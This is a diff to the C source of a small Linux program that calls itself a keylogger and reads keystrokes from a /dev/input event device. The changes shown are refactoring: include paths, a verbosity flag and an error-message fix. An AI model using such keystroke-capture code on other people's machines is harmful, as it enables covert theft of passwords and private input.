@@ -14,20 +14,20 @@
 #include <errno.h>
 #include <stdlib.h>
 #include <fcntl.h>
-#include <linux/input.h> // key defines can be found in here
+#include <linux/input.h> 
 #include <stdio.h>
 #include <string.h>
 #include <stdio.h>
 #include <unistd.h>
 
-#include "keymap.h"
-#include "keyboard-finder.h"
+#include "keymap/keymap.h"
+#include "keyboard-finder/keyboard-finder.h"
+
+#define VERBOSE 1
 
 int main() {
 
-    // let's be verbose for now to debug our program.
     printf("NaKtm keylogger started.\n");
-    fflush(stdout);
 
     /* How to find your keyboard device if find_keyboard_device
      * is failing:
@@ -37,7 +37,7 @@ int main() {
      * Look for the device event associated with the keyboard.
      * for example, I have two keyboards attached. One appears
      * as event3 and the other event 4. */
-	char* keyboard = find_keyboard_device();
+	char* keyboard = find_keyboard_device(VERBOSE);
 	if (keyboard == NULL) {
 		keyboard = "/dev/input/event3";
 		printf("Automatic keyboard device detection failed.\n");
@@ -63,7 +63,7 @@ int main() {
         }
 
     } else {
-        fprintf(stderr, "Error: Couldn't open keyboard file -- %s", strerror(errno));
+        fprintf(stderr, "Error: Couldn't open keyboard file -- %s\n", strerror(errno));
         exit(1);
     }
 
